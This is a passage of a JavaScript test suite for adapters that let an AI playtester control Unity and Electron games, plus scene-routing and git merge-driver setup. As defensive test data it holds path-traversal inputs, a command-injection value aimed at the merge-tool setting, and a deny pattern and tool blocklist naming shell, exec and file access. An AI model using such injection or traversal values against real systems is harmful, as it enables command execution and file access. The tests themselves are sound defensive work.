  assert.deepEqual([unity.sessions, unity.closed], [4, 4]);

  const bad = await bridge.callTool('send_input', { steps: [{ type: 'exec', code: 'File.Delete' }] });
  assert.equal(bad.isError, true);
  assert.equal(unity.calls.length, 4, 'a rejected step never reaches Unity');
});

test('unity start without a PlaytestDriver fails, names the card and leaves play mode', async () => {
  const world = unityWorld({ driver: false });
  const adapter = A.createAdapter('unity', world.opts);

  await assert.rejects(adapter.start(unityProfile), (err) => {
    assert.match(err.message, /no working PlaytestDriver/);
    assert.ok(err.message.includes(U.PLAYTEST_DRIVER_CARD.text));
    return true;
  });
  assert.equal(callNames(world.unity.calls).at(-1), 'manage_editor:stop');
  assert.deepEqual(adapter.tools().allowedTools, []);
  assert.equal(fs.existsSync(path.join(adapter.evidenceDir, U.FINAL_SHOT)), false, 'no evidence from a game that never ran');
});

test('unity start gives up when play mode never starts', async () => {
  const world = unityWorld({ playingAfter: Infinity });
  const adapter = A.createAdapter('unity', world.opts);

  await assert.rejects(adapter.start(unityProfile), /did not enter play mode within 5s/);
  assert.ok(world.t >= 5000);
  assert.equal(callNames(world.unity.calls).at(-1), 'manage_editor:stop');
});

test('unity profile: the MCP url must be loopback and the scene a project path', async () => {
  for (const bad of [
    { ...unityProfile, unityMcpUrl: 'http://192.168.1.5:8080/mcp' },
    { ...unityProfile, unityMcpUrl: 'file:///C:/x' },
    { ...unityProfile, scene: '../outside.unity' },
    { ...unityProfile, scene: 'Assets/../../x.unity' },
    { ...unityProfile, adapter: 'electron' },
  ]) {
    const world = unityWorld();
    const adapter = A.createAdapter('unity', world.opts);
    await assert.rejects(adapter.start(bad), /invalid project profile/, JSON.stringify(bad));
    assert.equal(world.unity.sessions, 0);
  }
});

// ============================================================================
// unity adapter over the official Unity MCP (Unity Pipeline)
// ============================================================================

const P = require('../helpers/playtest-bridge/pipeline-http.js');

const pipelineProfile = { adapter: 'unity', scene: 'Assets/Scenes/Level1.unity', readyTimeoutSec: 5 };
// A fake bearer token, built at runtime (never a secret-shaped literal).
const PIPE_TOKEN = Buffer.from(`lunacore-adapter-${'z'.repeat(20)}`).toString('base64');

/**
 * The open editor behind the Unity Pipeline at the HTTP level: the REAL
 * pipeline client runs on an injected fetch / readFile. Entering play mode
 * reloads the domain: the port file is gone for `reloadReads` reads, then the
 * editor answers 503 settling `busyReplies` times. `log` is what the editor saw.
 * Failure knobs: busyBeforePlay (play refused busy n times, not run),
 * lostPlayAnswer (play runs, its answer is lost), playFails, driverAuthFails.
 */
function fakePipelineEditor({
  reloadReads = 1, busyReplies = 1, driver = true, reloadForever = false, statusFails = false,
  busyBeforePlay = 0, lostPlayAnswer = false, playFails = false, driverAuthFails = false,
  busyBeforeStop = 0, stopFails = 0,
} = {}) {
  const ed = { log: [], requests: [], reads: [], dirs: [], sessions: 0, closed: 0, playMode: 'stopped', missing: 0, busy: 0, busyBeforePlay, busyBeforeStop, stopFails };
  const readFile = async (file) => {
    ed.reads.push(file);
    if ((reloadForever && ed.playMode === 'playing') || ed.missing > 0) {
      ed.missing = Math.max(0, ed.missing - 1);
      ed.log.push('(port file missing)');
      throw Object.assign(new Error(`ENOENT: no such file or directory, open '${file}'`), { code: 'ENOENT' });
    }
    return JSON.stringify({ pid: 99, port: 7802, evalToken: PIPE_TOKEN, lastHeartbeat: new Date().toISOString(), projectPath: 'game', endpoints: {} });
  };
  const reply = (status, json) => ({ ok: status < 300, status, text: async () => JSON.stringify(json) });
  const ok = (result) => reply(200, { success: true, result });
  const notFound = (command) => reply(400, { success: false, error: 'Command Not Found', errorDetails: `No command '${command}'` });
  const answers = {
    'scene open': (p) => ok({ path: p.path }),
    'editor.playmode start': () => {
      if (playFails) return reply(400, { success: false, error: 'Play mode is disabled in this project' });
      ed.playMode = 'playing';
      ed.missing = reloadReads;
      ed.busy = busyReplies;
      return ok({});
    },
    'editor.playmode stop': () => {
      if (ed.stopFails > 0) {
        ed.stopFails -= 1;
        return reply(400, { success: false, error: 'Play mode could not stop' });
      }
      ed.playMode = 'stopped';
      return ok({});
    },
    'editor status': (p, command) => (statusFails ? notFound(command) : ok({
      status: 'ready', compiling: false, domainReloadInProgress: false, playMode: ed.playMode, playerLoopTicking: true, runInBackground: true,
    })),
    'console get': () => ok({
      entries: [{ level: 'error', logType: 'Exception', message: 'NullReferenceException in Enemy.Update', stackTrace: 'Enemy.cs:12' }],
      counts: { error: 1, warn: 0, log: 0 },
      groundTruth: { compilationFailed: false, consoleErrors: 1 },
    }),
    'playtest state': (p, command) => {
      if (driverAuthFails) return reply(401, { success: false, error: 'Unauthorized' });
      return driver ? ok({ scene: 'Level1', score: 3 }) : notFound(command);
    },
    'playtest screenshot': (p, command) => (driver ? ok({ png: PNG, width: 1920, height: 1080 }) : notFound(command)),
  };
  const fetch = async (url, init) => {
    const { command, parameters } = JSON.parse(init.body);
    ed.requests.push({ url, command, parameters, auth: init.headers.authorization });
    const playing = command === 'editor.playmode start';
    const stopping = command === 'editor.playmode stop';
    if (ed.busy > 0 || (playing && ed.busyBeforePlay > 0) || (stopping && ed.busyBeforeStop > 0)) {
      if (playing && ed.busyBeforePlay > 0) ed.busyBeforePlay -= 1;
      else if (stopping && ed.busyBeforeStop > 0) ed.busyBeforeStop -= 1;
      else ed.busy -= 1;
      ed.log.push(`${command} (busy)`);
      return reply(503, { success: false, status: 'busy', busyReason: 'settling', retryable: true });
    }
    ed.log.push(command);
    const res = answers[command] ? answers[command](parameters, command) : notFound(command);
    if (playing && lostPlayAnswer) throw new TypeError('fetch failed', { cause: Object.assign(new Error('other side closed'), { code: 'UND_ERR_SOCKET' }) });
    return res;
  };
  ed.connect = (dir) => {
    ed.sessions += 1;
    ed.dirs.push(dir);
    const client = P.createPipelineClient({ projectDir: dir, fetch, readFile });
    return { exec: client.exec, close: async () => { ed.closed += 1; } };
  };
  return ed;
}

function pipelineWorld(editorOpts) {
  const world = fakeWorld();
  world.editor = fakePipelineEditor(editorOpts);
  world.logs = [];
  world.opts.connectPipeline = world.editor.connect;
  world.opts.connectUnity = () => {
    throw new Error('a profile without unityMcpUrl must not use MCP for Unity');
  };
  world.opts.nodeBinary = 'C:\\LunaCore\\LunaCore.exe';
  world.opts.log = (line) => world.logs.push(line);
  return world;
}

test('unity pipeline: scene open, play, a poll that survives the domain reload, then playtest state - one connection', async () => {
  const world = pipelineWorld();
  const adapter = A.createAdapter('unity', world.opts);
  const res = await adapter.start(pipelineProfile);

  assert.deepEqual(res, { handle: { kind: 'unity', scene: 'Assets/Scenes/Level1.unity' } });
  assert.deepEqual(world.editor.log, [
    'scene open',
    'editor.playmode start',
    '(port file missing)',
    'editor status (busy)',
    'editor status',
    'playtest state',
  ]);
  assert.deepEqual(world.editor.requests[0].parameters, { path: 'Assets/Scenes/Level1.unity' });
  assert.ok(world.editor.requests.every((r) => r.url === 'http://127.0.0.1:7802/api/exec' && r.auth === `Bearer ${PIPE_TOKEN}`));
  assert.equal(world.t, 1000, 'two retries, one poll interval apart');
  assert.deepEqual([world.editor.sessions, world.editor.closed], [1, 1], 'one editor = one connection, closed again');
  assert.deepEqual(world.editor.dirs, [path.resolve(world.opts.projectDir)], 'the repo dir is the Unity project');
  assert.equal(world.editor.reads[0], path.join(world.opts.projectDir, 'Library', 'Pipeline', '.unity-pipeline-port'));
  assert.equal(world.spawns.length, 0, 'nothing is launched: the editor is already open');
  await adapter.stop();
});

test('unity pipeline stop saves unity-console.json, unity-state.json and final.png, then runs editor.playmode stop once', async () => {
  const world = pipelineWorld();
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);
  world.editor.log.length = 0;
  world.editor.requests.length = 0;

  assert.equal(await adapter.stop(), true);
  assert.equal(await adapter.stop(), true);
  assert.deepEqual(world.editor.log, ['console get', 'playtest state', 'playtest screenshot', 'editor.playmode stop']);
  assert.deepEqual(world.editor.requests[0].parameters, { tail: 100, level: 'warning' });
  const consoleDump = JSON.parse(fs.readFileSync(path.join(adapter.evidenceDir, U.CONSOLE_FILE), 'utf8'));
  assert.equal(consoleDump.entries[0].message, 'NullReferenceException in Enemy.Update');
  assert.deepEqual(JSON.parse(fs.readFileSync(path.join(adapter.evidenceDir, U.STATE_FILE), 'utf8')), { scene: 'Level1', score: 3 });
  assert.ok(isPng(path.join(adapter.evidenceDir, U.FINAL_SHOT)));
  assert.deepEqual(adapter.tools().allowedTools, []);
  assert.equal(world.editor.playMode, 'stopped');
});

test('unity pipeline stop: a busy editor (stop not run) gets editor.playmode stop again', async () => {
  const world = pipelineWorld({ busyBeforeStop: 2 });
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);
  world.editor.log.length = 0;

  assert.equal(await adapter.stop(), true);
  assert.deepEqual(world.editor.log.slice(-3), ['editor.playmode stop (busy)', 'editor.playmode stop (busy)', 'editor.playmode stop']);
  assert.equal(world.editor.playMode, 'stopped');
});

test('unity pipeline stop: a failed stop is not cached - a later stop() tries again', async () => {
  const world = pipelineWorld({ stopFails: 1 });
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);
  world.editor.log.length = 0;

  assert.equal(await adapter.stop(), false);
  assert.ok(world.logs.some((l) => /could not leave Unity play mode: .*Play mode could not stop/.test(l)), world.logs.join('\n'));
  assert.equal(world.editor.playMode, 'playing');
  assert.equal(await adapter.stop(), true);
  assert.equal(world.editor.playMode, 'stopped');
  assert.equal(await adapter.stop(), true);
  assert.deepEqual(world.editor.log.filter((l) => l.startsWith('editor.playmode stop')), ['editor.playmode stop', 'editor.playmode stop'], 'success is cached');
});

test('unity pipeline tools() hands the bridge --unity-project (repo dir + unityProjectSubdir), after start', async () => {
  const world = pipelineWorld();
  const adapter = A.createAdapter('unity', world.opts);
  assert.deepEqual(adapter.tools().allowedTools, [], 'nothing before play mode');
  await adapter.start({ ...pipelineProfile, unityProjectSubdir: 'Game\\Unity' });

  const unityDir = path.join(world.opts.projectDir, 'Game', 'Unity');
  assert.deepEqual(world.editor.dirs, [unityDir]);
  assert.equal(world.editor.reads[0], path.join(unityDir, 'Library', 'Pipeline', '.unity-pipeline-port'));
  const { mcpConfig, allowedTools } = adapter.tools();
  assert.deepEqual(mcpConfig.mcpServers[SERVER_NAMES.unity].args, [
    BRIDGE_PATH,
    '--backend', 'unity',
    '--evidence-dir', adapter.evidenceDir,
    '--unity-project', unityDir,
  ]);
  assert.deepEqual(allowedTools, toolNames('unity').map((t) => `mcp__${SERVER_NAMES.unity}__${t}`));
  await adapter.stop();
});

test('unity pipeline start without the PlaytestDriver commands fails, names the card and leaves play mode', async () => {
  const world = pipelineWorld({ driver: false });
  const adapter = A.createAdapter('unity', world.opts);

  await assert.rejects(adapter.start(pipelineProfile), (err) => {
    assert.ok(err.message.startsWith(`${U.NO_DRIVER_ERROR} (Unity command 'playtest state' failed: Command Not Found`), err.message);
    assert.ok(err.message.includes(U.PLAYTEST_DRIVER_CARD.text));
    return true;
  });
  assert.deepEqual(world.editor.log.slice(-2), ['playtest state', 'editor.playmode stop'], 'a missing command is not retried');
  assert.deepEqual(adapter.tools().allowedTools, []);
  assert.equal(fs.existsSync(path.join(adapter.evidenceDir, U.FINAL_SHOT)), false, 'no evidence from a game that never ran');
});

test('unity pipeline: a reload that never ends times out with the last error', async () => {
  const world = pipelineWorld({ reloadForever: true });
  const adapter = A.createAdapter('unity', world.opts);

  await assert.rejects(adapter.start(pipelineProfile), /did not enter play mode within 5s \(last error: Unity editor not open on .*, or com\.unity\.pipeline not installed\)/);
  assert.ok(world.t >= 5000);
  assert.ok(world.logs.some((l) => /could not leave Unity play mode/.test(l)), 'the failed stop is logged, not swallowed');
});

test('unity pipeline: a failure that is not a reload ends the wait at once', async () => {
  const world = pipelineWorld({ reloadReads: 0, busyReplies: 0, statusFails: true });
  const adapter = A.createAdapter('unity', world.opts);

  await assert.rejects(adapter.start(pipelineProfile), /Unity command 'editor status' failed: Command Not Found/);
  assert.equal(world.t, 0, 'no retry');
  assert.equal(world.editor.log.at(-1), 'editor.playmode stop');
});

test('unity pipeline: a busy editor is waited out before play; a play whose answer is lost still reaches play mode', async () => {
  const world = pipelineWorld({ busyBeforePlay: 1, lostPlayAnswer: true });
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);

  assert.deepEqual(world.editor.log, [
    'scene open',
    'editor.playmode start (busy)', // not run: sent again
    'editor.playmode start', // run, but the answer is lost: never sent twice
    '(port file missing)',
    'editor status (busy)',
    'editor status',
    'playtest state',
  ]);
  assert.equal(world.t, 1500);
  assert.ok(world.logs.some((l) => /Unity play mode: no answer \(.*fetch failed: UND_ERR_SOCKET\)/.test(l)), world.logs.join('\n'));
  assert.ok(adapter.tools().allowedTools.length > 0);
  await adapter.stop();
});

test('unity pipeline: a play that fails outright still leaves play mode on the way out', async () => {
  const world = pipelineWorld({ playFails: true });
  const adapter = A.createAdapter('unity', world.opts);

  await assert.rejects(adapter.start(pipelineProfile), /Unity command 'editor\.playmode start' failed: Play mode is disabled/);
  assert.deepEqual(world.editor.log, ['scene open', 'editor.playmode start', 'editor.playmode stop']);
});

test('unity pipeline: an editor that refuses LunaCore is not reported as a missing PlaytestDriver', async () => {
  const world = pipelineWorld({ driverAuthFails: true });
  const adapter = A.createAdapter('unity', world.opts);

  await assert.rejects(adapter.start(pipelineProfile), (err) => {
    assert.match(err.message, /^Unity command 'playtest state' failed: Unauthorized$/);
    assert.equal(err.message.includes(U.NO_DRIVER_ERROR), false);
    return true;
  });
  assert.equal(world.editor.log.at(-1), 'editor.playmode stop');
});

test('unity pipeline: unityProjectSubdir must stay inside the project; the transport follows unityMcpUrl', async () => {
  for (const unityProjectSubdir of ['../outside', 'Game/../../x', 'C:\\Windows', '/etc', '\\\\server\\share', 7, 'a\u0000b', 'x'.repeat(300)]) {
    const world = pipelineWorld();
    const adapter = A.createAdapter('unity', world.opts);
    await assert.rejects(adapter.start({ ...pipelineProfile, unityProjectSubdir }), /invalid project profile: unityProjectSubdir/, String(unityProjectSubdir));
    assert.equal(world.editor.sessions, 0);
  }
  const root = path.resolve(tmpDir('lw-unity-root-'));
  for (const sub of [undefined, null, '', '   ']) assert.deepEqual(U.unityProjectDir(root, { unityProjectSubdir: sub }), { dir: root, reason: null });
  assert.equal(U.unityProjectDir(root, { unityProjectSubdir: 'Game/' }).dir, path.join(root, 'Game'));
  assert.equal(U.unityProjectDir(root, { unityProjectSubdir: '..game' }).dir, path.join(root, '..game'), 'a folder named ..game is inside');
  assert.equal(U.unityTransport({ adapter: 'unity' }), 'pipeline');
  assert.equal(U.unityTransport({ adapter: 'unity', unityMcpUrl: 'http://127.0.0.1:8080/mcp' }), 'mcp');
  assert.equal(U.unityTransport(null), 'pipeline');
});

// ============================================================================
// both adapters: no file or code access
// ============================================================================

const FILE_OR_CODE = /file|path|dir|folder|read_?file|write|eval|exec|script|code|shell|bash|command|navigate|upload|source|require|import/i;
const BUILT_IN_TOOLS = ['Read', 'Write', 'Edit', 'MultiEdit', 'Bash', 'Grep', 'Glob', 'NotebookEdit', 'WebFetch', 'WebSearch', 'Task', 'Agent'];

async function startedTools(name) {
  if (name === 'electron') {
    const world = electronWorld();
    const adapter = A.createAdapter('electron', world.opts);
    await adapter.start(electronProfile);
    return { adapter, tools: adapter.tools() };
  }
  const world = unityWorld();
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(unityProfile);
  return { adapter, tools: adapter.tools() };
}

for (const backend of ['electron', 'unity']) {
  test(`${backend} tool list has no file or code access tools`, async () => {
    const { adapter, tools } = await startedTools(backend);
    const prefix = `mcp__${SERVER_NAMES[backend]}__`;
    assert.ok(tools.allowedTools.length > 0);
    for (const t of tools.allowedTools) {
      assert.ok(t.startsWith(prefix), t);
      assert.doesNotMatch(t.slice(prefix.length), FILE_OR_CODE, t);
    }
    for (const builtIn of BUILT_IN_TOOLS) assert.ok(!tools.allowedTools.includes(builtIn), builtIn);

    // What the Playtester sees from the bridge is exactly the allow-list, and
    // no tool takes a path, a script or code as an argument.
    const bridge = createBridge({ backend, evidenceDir: adapter.evidenceDir, invoke: async () => ({}) });
    const listed = (await bridge.handle({ jsonrpc: '2.0', id: 1, method: 'tools/list' })).result.tools;
    assert.deepEqual(listed.map((d) => `${prefix}${d.name}`), tools.allowedTools);
    const argNames = JSON.stringify(listed.map((d) => d.inputSchema)).match(/"([A-Za-z_]+)":\{"type"/g) || [];
    for (const arg of argNames) assert.doesNotMatch(arg, FILE_OR_CODE, arg);

    // A tool outside the list is refused by the bridge itself.
    for (const name of ['evaluate', 'browser_evaluate', 'read_file', 'execute_menu_item', 'manage_script']) {
      const res = await bridge.callTool(name, { script: 'require("fs")' });
      assert.equal(res.isError, true, name);
    }
    await adapter.stop();
  });
}

test('a screenshot name cannot leave the evidence dir', async () => {
  const evidenceDir = tmpDir('lw-shot-');
  const bridge = createBridge({ backend: 'electron', evidenceDir, invoke: async () => ({ png: PNG }) });
  for (const name of ['../escape', '..\\escape', 'sub/dir', 'C:evil', '.hidden', '']) {
    const res = await bridge.callTool('screenshot', { name });
    assert.equal(res.isError, true, name);
  }
  const ok = await bridge.callTool('screenshot', { name: 'home-wide' });
  assert.equal(ok.isError, undefined);
  assert.deepEqual(fs.readdirSync(evidenceDir), ['home-wide.png']);
});

// ============================================================================
// evidence per iteration
// ============================================================================

test('electron evidence is saved per iteration', async () => {
  const runsRoot = path.join(tmpDir('lw-runs-'), 'runs');
  const dirs = [];
  for (const iteration of [1, 2]) {
    const world = electronWorld({ iteration, runsRoot, exitOnQuit: false });
    const adapter = A.createAdapter('electron', world.opts);
    await adapter.start(electronProfile);
    assert.equal(adapter.tools().mcpConfig.mcpServers[SERVER_NAMES.electron].args[4], adapter.evidenceDir, 'the bridge saves into this iteration');
    await adapter.stop();
    dirs.push(adapter.evidenceDir);
  }
  assert.deepEqual(dirs, [1, 2].map((n) => A.evidenceDirFor(runsRoot, 'abc123', n)));
  for (const dir of dirs) {
    assert.ok(isPng(path.join(dir, 'final-1.png')), dir);
    assert.ok(fs.existsSync(path.join(dir, E.APP_LOG)), dir);
  }
});

test('unity evidence is saved per iteration', async () => {
  const runsRoot = path.join(tmpDir('lw-runs-'), 'runs');
  const dirs = [];
  for (const iteration of [1, 2]) {
    const world = unityWorld(undefined, { iteration, runsRoot });
    const adapter = A.createAdapter('unity', world.opts);
    await adapter.start(unityProfile);
    await adapter.stop();
    dirs.push(adapter.evidenceDir);
  }
  assert.deepEqual(dirs, [1, 2].map((n) => A.evidenceDirFor(runsRoot, 'abc123', n)));
  for (const dir of dirs) {
    for (const file of [U.CONSOLE_FILE, U.STATE_FILE, U.FINAL_SHOT]) assert.ok(fs.existsSync(path.join(dir, file)), `${dir} ${file}`);
  }
});

// ============================================================================
// scene / prefab work -> the one scene worker
// ============================================================================

const SCENE_CARDS = [
  { at: 1, text: 'Score counter logic', files: ['Assets/Scripts/Score.cs'] },
  { at: 2, text: 'Place the HUD in the level', files: ['Assets/Scenes/Level1.unity'] },
  { at: 3, text: 'Give Enemy.prefab a hit flash' },
  { at: 4, text: 'Unity Test Framework tests for the score' },
];

function scenePlan() {
  return [
    { id: 'score', title: 'Score', todoAts: [1], files: ['Assets/Scripts/Score.cs'], dependsOn: [], prompt: 'score', model: 'sonnet', effort: 'medium' },
    { id: 'hud', title: 'HUD', todoAts: [2], files: ['Assets/Scenes/Level1.unity'], dependsOn: ['score'], prompt: 'hud', model: 'sonnet', effort: 'medium', verify: 'unity tests' },
    { id: 'enemy', title: 'Enemy', todoAts: [3], files: ['Assets/Scripts/Enemy.cs'], dependsOn: [], prompt: 'enemy', model: 'opus', effort: 'high' },
    { id: 'tests', title: 'Tests', todoAts: [4], files: ['Assets/Tests/ScoreTests.cs'], dependsOn: ['hud', 'enemy'], prompt: 'tests', model: 'sonnet', effort: 'medium' },
  ];
}

test('scene and prefab cards are always routed to the single scene worker', () => {
  const plan = scenePlan();
  const out = Scene.routeScenePackages(plan, SCENE_CARDS);

  assert.deepEqual(out.map((p) => p.id), ['score', Scene.SCENE_WORKER_ID, 'tests']);
  const worker = out[1];
  assert.deepEqual(worker.todoAts, [2, 3]);
  assert.deepEqual(worker.files, ['Assets/Scenes/Level1.unity', 'Assets/Scripts/Enemy.cs']);
  assert.deepEqual(worker.dependsOn, ['score']);
  assert.equal(worker.model, 'opus', 'the strongest model of its members');
  assert.equal(worker.effort, 'high');
  assert.equal(worker.verify, 'unity tests');
  assert.match(worker.prompt, /## HUD[\s\S]*hud[\s\S]*## Enemy[\s\S]*enemy/);
  assert.deepEqual(out[2].dependsOn, [Scene.SCENE_WORKER_ID], 'deps on merged packages point at the worker');
  assert.ok(out[0].prompt.endsWith(Scene.CODE_WORKER_NOTE), 'code workers are told to leave scenes alone');
  assert.equal(out.filter((p) => p.files.some(Scene.isSceneFile)).length, 1, 'exactly one package touches scenes');
  assert.deepEqual(plan, scenePlan(), 'the planner output is not mutated');
});

test('a package between two scene packages is folded in, so no dependency cycle appears', () => {
  const plan = [
    { id: 'a', todoAts: [], files: ['Assets/A.unity'], dependsOn: [] },
    { id: 'mid', todoAts: [], files: ['Assets/Scripts/Mid.cs'], dependsOn: ['a'] },
    { id: 'b', todoAts: [], files: ['Assets/B.prefab'], dependsOn: ['mid'] },
    { id: 'free', todoAts: [], files: ['Assets/Scripts/Free.cs'], dependsOn: [] },
  ];
  const out = Scene.routeScenePackages(plan, []);
  assert.deepEqual(out.map((p) => p.id), [Scene.SCENE_WORKER_ID, 'free']);
  assert.deepEqual(out[0].dependsOn, []);
});

test('a plan without scene work is returned as it was', () => {
  const plan = [{ id: 'a', todoAts: [1], files: ['src/app.js'], dependsOn: [] }];
  assert.equal(Scene.routeScenePackages(plan, [{ at: 1, text: 'Unity build settings', files: ['src/app.js'] }]), plan);
  assert.equal(Scene.isSceneCard({ text: 'Fix the Main.unity lighting' }), true);
  assert.equal(Scene.isSceneCard({ text: 'x', details: 'touches Player.prefab only' }), true);
  assert.equal(Scene.isSceneCard({ text: 'Port the game to Unity 6' }), false);
  assert.equal(Scene.isSceneCard({ text: 'Upgrade com.unity.inputsystem' }), false);
});

test('the ownership map gives every scene and prefab to the scene worker', () => {
  const map = Scene.sceneOwnership({ 'Assets/Scripts/Score.cs': 'score', 'Assets/Scenes/Level1.unity': 'hud' });
  assert.deepEqual(map, {
    'Assets/Scripts/Score.cs': 'score',
    'Assets/Scenes/Level1.unity': Scene.SCENE_WORKER_ID,
    '**/*.unity': Scene.SCENE_WORKER_ID,
    '**/*.prefab': Scene.SCENE_WORKER_ID,
  });
  assert.deepEqual(Scene.sceneOwnership([{ path: 'Assets/P.prefab', cardId: 7 }, { path: 'a.cs', cardId: 8 }])['Assets/P.prefab'], Scene.SCENE_WORKER_ID);
});

function unityBuilder({ unity }) {
  const calls = { makePlan: [], merge: [] };
  let settle = null;
  const orchestra = {
    makePlan: async (ctx) => {
      calls.makePlan.push(ctx);
      settle = ctx.onRunSettled;
      return { ok: true, plan: { id: 'p1', errors: [] } };
    },
    launch: async () => ({ ok: true }),
    cancelPlanWait: () => ({ ok: true }),
  };
  const builder = createGodModeBuilder({
    orchestra,
    profileId: () => 'default',
    env: () => ({}),
    isUnityProject: () => unity,
    configureUnityMerge: async (repo) => {
      calls.merge.push(repo);
      return { ok: true, attributes: true, driver: true };
    },
  });
  return { builder, calls, settle: (r) => settle(r) };
}

test('a Unity build: merge driver set up, scene ownership passed, scene packages routed by the planner wrapper', async () => {
  const { builder, calls, settle } = unityBuilder({ unity: true });
  const planner = builder.wrapPlanner(async () => ({ ok: true, raw: { packages: scenePlan() } }));
  const building = builder.build({ projectId: 'game', repoPath: '/game', cards: SCENE_CARDS, checkCommand: '' });
  for (let i = 0; i < 5 && !calls.makePlan.length; i += 1) await new Promise((r) => setImmediate(r));

  assert.deepEqual(calls.merge, ['/game']);
  assert.deepEqual(calls.makePlan[0].ownership, Scene.sceneOwnership());
  const res = await planner({});
  assert.deepEqual(res.raw.packages.map((p) => p.id), ['score', Scene.SCENE_WORKER_ID, 'tests']);
  settle({ planId: 'p1', integration: { state: 'done' } });
  await building;
});

test('a non-Unity build is planned exactly as before', async () => {
  const { builder, calls, settle } = unityBuilder({ unity: false });
  const building = builder.build({ projectId: 'web', repoPath: '/web', cards: SCENE_CARDS.slice(0, 1), checkCommand: '' });
  for (let i = 0; i < 5 && !calls.makePlan.length; i += 1) await new Promise((r) => setImmediate(r));

  assert.deepEqual(calls.merge, []);
  assert.equal('ownership' in calls.makePlan[0], false);
  settle({ planId: 'p1', integration: { state: 'done' } });
  await building;
});

// ============================================================================
// UnityYAMLMerge merge driver
// ============================================================================

const MERGE_TOOL = 'C:\\Program Files\\Unity\\Hub\\Editor\\6000.0.23f1\\Editor\\Data\\Tools\\UnityYAMLMerge.exe';

/** A temp repo dir and a fake git: rev-parse answers `.git`, config calls are recorded. */
function mergeRepo({ git = true } = {}) {
  const repo = tmpDir('lw-unity-repo-');
  const calls = [];
  const execImpl = (file, args, options, cb) => {
    calls.push(args);
    if (!git) return cb(new Error('not a git repository'), '', 'fatal: not a git repository');
    if (args.includes('rev-parse')) return cb(null, '.git\n', '');
    return cb(null, '', '');
  };
  return { repo, calls, execImpl };
}

test('the merge driver config is written: .gitattributes, info/attributes and git config', async () => {
  const { repo, calls, execImpl } = mergeRepo();
  fs.writeFileSync(path.join(repo, '.gitattributes'), '* text=auto\r\n*.png binary\r\n');

  const res = await Scene.configureUnityMerge(repo, { mergeTool: MERGE_TOOL, execImpl });
  assert.deepEqual(res, { ok: true, attributes: true, driver: true, tool: MERGE_TOOL });

  const attributes = fs.readFileSync(path.join(repo, '.gitattributes'), 'utf8');
  assert.ok(attributes.startsWith('* text=auto\n*.png binary\n'), 'existing rules kept');
  for (const ext of ['unity', 'prefab', 'asset']) assert.match(attributes, new RegExp(`^\\*\\.${ext} merge=unityyamlmerge eol=lf$`, 'm'));
  // The common dir's info/attributes covers every worktree of the repo.
  assert.equal(fs.readFileSync(path.join(repo, '.git', 'info', 'attributes'), 'utf8'), Scene.withAttributesBlock(''));

  const configs = calls.filter((a) => a.includes('config')).map((a) => a.slice(a.indexOf('config') + 1));
  assert.deepEqual(configs, [
    ['merge.unityyamlmerge.name', 'Unity SmartMerge (UnityYAMLMerge)'],
    ['merge.unityyamlmerge.driver', '"C:/Program Files/Unity/Hub/Editor/6000.0.23f1/Editor/Data/Tools/UnityYAMLMerge.exe" merge -h -p --force %O %B %A %A'],
    ['merge.unityyamlmerge.recursive', 'binary'],
  ]);
  assert.ok(calls.every((a) => a[0] === '-C' && a[1] === repo), 'git runs in the repo');

  // Idempotent: a second run changes nothing.
  await Scene.configureUnityMerge(repo, { mergeTool: MERGE_TOOL, execImpl });
  assert.equal(fs.readFileSync(path.join(repo, '.gitattributes'), 'utf8'), attributes);
});

test("UnityYAMLMerge is found in Unity Hub for the project's editor version", async () => {
  const { repo, calls, execImpl } = mergeRepo();
  fs.mkdirSync(path.join(repo, 'ProjectSettings'));
  fs.writeFileSync(path.join(repo, 'ProjectSettings', 'ProjectVersion.txt'), 'm_EditorVersion: 6000.0.23f1\nm_EditorVersionWithRevision: 6000.0.23f1 (abc)\n');
  assert.equal(Scene.isUnityProject(repo), true);
  assert.equal(Scene.isUnityProject(tmpDir('lw-not-unity-')), false);

  const hubTool = 'D:\\Unity\\Hub\\Editor\\6000.0.23f1\\Editor\\Data\\Tools\\UnityYAMLMerge.exe';
  const fsImpl = { ...fs, existsSync: (p) => p === hubTool || fs.existsSync(p) };
  assert.equal(Scene.findUnityYamlMerge(repo, { fsImpl, platform: 'win32', env: { ProgramFiles: 'D:\\' } }), hubTool);

  const res = await Scene.configureUnityMerge(repo, { execImpl, fsImpl, platform: 'win32', env: { ProgramFiles: 'D:\\' } });
  assert.equal(res.driver, true);
  assert.equal(res.tool, hubTool);
  assert.ok(calls.some((a) => a.includes('merge.unityyamlmerge.driver')));
});

test('without UnityYAMLMerge the attributes are still written; unsafe or missing git is refused', async () => {
  const none = mergeRepo();
  const res = await Scene.configureUnityMerge(none.repo, { execImpl: none.execImpl, platform: 'win32', env: {} });
  assert.equal(res.ok, true);
  assert.equal(res.driver, false);
  assert.match(res.warning, /UnityYAMLMerge not found/);
  assert.ok(fs.existsSync(path.join(none.repo, '.gitattributes')));
  assert.equal(none.calls.filter((a) => a.includes('config')).length, 0);

  const unsafe = mergeRepo();
  const bad = await Scene.configureUnityMerge(unsafe.repo, { mergeTool: 'C:\\x" && calc && "', execImpl: unsafe.execImpl });
  assert.deepEqual([bad.ok, bad.error], [false, 'badMergeTool']);
  assert.equal(unsafe.calls.filter((a) => a.includes('config')).length, 0);

  const noGit = mergeRepo({ git: false });
  const res2 = await Scene.configureUnityMerge(noGit.repo, { mergeTool: MERGE_TOOL, execImpl: noGit.execImpl });
  assert.deepEqual([res2.ok, res2.error], [false, 'notGitRepo']);
  assert.equal(fs.existsSync(path.join(noGit.repo, '.gitattributes')), false);
});

// ============================================================================
// PlaytestDriver God Mode card
// ============================================================================

test('the PlaytestDriver card builds Unity Pipeline commands: dev-only guard, scripted input, JSON state, screenshot, PlayMode tests', () => {
  const card = U.PLAYTEST_DRIVER_CARD;
  assert.ok(Object.isFrozen(card));
  assert.match(card.text, /^PlaytestDriver as Unity Pipeline commands/);
  assert.equal(U.PLAYTEST_DRIVER_GUARD, '#if UNITY_EDITOR || DEVELOPMENT_BUILD');
  assert.ok(card.details.includes(U.PLAYTEST_DRIVER_GUARD) && card.details.includes('#endif'));
  assert.match(card.details, /com\.unity\.pipeline/);
  assert.match(card.details, /\[CliGroupCommand\(Group/);
  assert.match(card.details, /Group = "playtest"/);
  // Exactly the commands helpers/playtest-bridge/unity.js calls.
